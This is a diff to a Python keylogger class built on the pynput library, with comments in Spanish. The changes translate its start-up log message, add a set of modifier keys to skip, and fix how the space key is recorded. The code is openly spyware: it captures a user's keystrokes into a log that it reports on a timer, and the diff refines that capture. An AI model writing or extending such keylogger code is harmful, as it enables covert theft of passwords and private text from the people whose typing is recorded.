@@ -4,11 +4,13 @@ import threading
 class Keylogger:
     def __init__(self, intervalo, archivo_log):
         # Log inicial que indica que el keylogger ha comenzado
-        self.log = "keylogger started"
+        self.log = "INICIÓ EL KEYLOGGER"
         # Intervalo en segundos para reportar el log
         self.intervalo = intervalo
         # Ruta del archivo donde se guardará el log
         self.archivo_log = archivo_log
+        # Lista de teclas especiales a ignorar
+        self.teclas_ignoradas = {pynput.keyboard.Key.shift, pynput.keyboard.Key.shift_r, pynput.keyboard.Key.shift_l, pynput.keyboard.Key.ctrl, pynput.keyboard.Key.ctrl_r, pynput.keyboard.Key.ctrl_l, pynput.keyboard.Key.alt, pynput.keyboard.Key.alt_r, pynput.keyboard.Key.alt_l, pynput.keyboard.Key.caps_lock, pynput.keyboard.Key.tab, pynput.keyboard.Key.esc}
 
     def append_to_log(self, string):
         # Agrega el texto al log
@@ -20,7 +22,10 @@ class Keylogger:
             current_key = str(key.char)
         except AttributeError:
             # Si la tecla no tiene un atributo 'char', maneja teclas especiales
-            if key == key.space:
+            if key in self.teclas_ignoradas:
+                # Si la tecla está en la lista de teclas a ignorar, no hacer nada
+                return
+            elif key == pynput.keyboard.Key.space:
                 # Si la tecla es el espacio, representa el espacio en blanco
                 current_key = " "
             else:
